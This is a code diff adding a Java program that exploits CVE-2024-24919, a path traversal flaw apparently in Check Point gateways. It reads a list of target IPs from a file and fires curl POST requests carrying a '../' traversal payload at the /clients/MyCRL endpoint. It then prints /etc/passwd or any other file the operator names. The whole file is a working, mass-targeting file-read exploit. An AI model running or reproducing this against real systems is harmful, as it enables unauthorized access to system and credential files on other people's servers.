@@ -1,0 +1,86 @@
+import java.io.*;
+import java.util.*;
+import java.nio.file.*;
+
+public class CVE_2024_24919 {
+
+    // ANSI escape codes for coloring
+    private static final String BLUE = "\033[94m";
+    private static final String ORANGE = "\033[93m";
+    private static final String GREEN = "\033[92m";
+    private static final String RESET = "\033[0m";
+
+    public static void main(String[] args) {
+        List<String> ips = readIPsFromFile("domain-IP.txt");
+
+        for (String ip : ips) {
+            ip = ip.trim(); // Ensure there are no leading or trailing spaces
+            String[] result = checkVulnerability(ip);
+
+            if ("vulnerable".equals(result[0])) {
+                Scanner scanner = new Scanner(System.in);
+
+                System.out.print(BLUE + "Do you want to print the response body data? (Yes/No): " + RESET);
+                String printResponse = scanner.nextLine().trim().toLowerCase();
+                if ("yes".equals(printResponse)) {
+                    System.out.println(GREEN + result[1] + RESET);
+                }
+
+                System.out.print(BLUE + "Do you want to change the directory of the file? (Yes/No): " + RESET);
+                String changeDir = scanner.nextLine().trim().toLowerCase();
+                if ("yes".equals(changeDir)) {
+                    System.out.print(ORANGE + "Please enter the new file name to replace 'etc/passwd': " + RESET);
+                    String newFileName = scanner.nextLine().trim();
+                    result = checkVulnerability(ip, newFileName);
+                    if ("vulnerable".equals(result[0])) {
+                        System.out.println("With new file name '" + newFileName + "':");
+                        System.out.println(GREEN + result[1] + RESET);
+                    }
+                }
+            }
+        }
+    }
+
+    private static List<String> readIPsFromFile(String fileName) {
+        try {
+            return Files.readAllLines(Paths.get(fileName));
+        } catch (IOException e) {
+            e.printStackTrace();
+            return Collections.emptyList();
+        }
+    }
+
+    private static String[] checkVulnerability(String ip) {
+        return checkVulnerability(ip, "etc/passwd");
+    }
+
+    private static String[] checkVulnerability(String ip, String fileName) {
+        String[] commands = {
+            String.format("curl -i -s -k -X POST -H \"Host: %s\" -H \"Content-Length: 39\" --data-binary \"aCSHELL/../../../../../../../%s\" \"https://%s/clients/MyCRL\"", ip, fileName, ip),
+            String.format("curl -i -s -k -X POST -H \"Host: %s\" -H \"Content-Length: 39\" --data-binary \"aCSHELL/../../../../../../../%s\" --tlsv1.2 \"https://%s/clients/MyCRL\"", ip, fileName, ip)
+        };
+
+        for (String command : commands) {
+            try {
+                Process process = new ProcessBuilder("cmd.exe", "/c", command).start();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder output = new StringBuilder();
+                String line;
+
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
+
+                int exitCode = process.waitFor();
+                if (exitCode == 0 && (output.toString().contains("root") || output.toString().contains("admin") || output.toString().contains("nobody"))) {
+                    System.out.println(GREEN + ip + " is vulnerable." + RESET);
+                    return new String[]{"vulnerable", output.toString()};
+                }
+            } catch (IOException | InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+
+        return new String[]{"not-vulnerable", null};
+    }
+}
